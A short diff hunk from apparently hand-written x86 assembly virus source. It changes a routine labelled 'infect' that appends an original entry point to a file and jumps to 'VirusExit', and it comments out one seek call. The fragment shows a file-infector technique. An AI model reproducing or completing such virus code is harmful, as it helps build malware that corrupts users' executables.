@@ -106,7 +106,7 @@ infect:
 	lseek FD, -4, SEEK_END
 	lea ecx, [original_entry]
 	write FD, ecx, 4
-	lseek FD, 0, SEEK_SET
+	; lseek FD, 0, SEEK_SET
 
 	close FD
 	jmp VirusExit
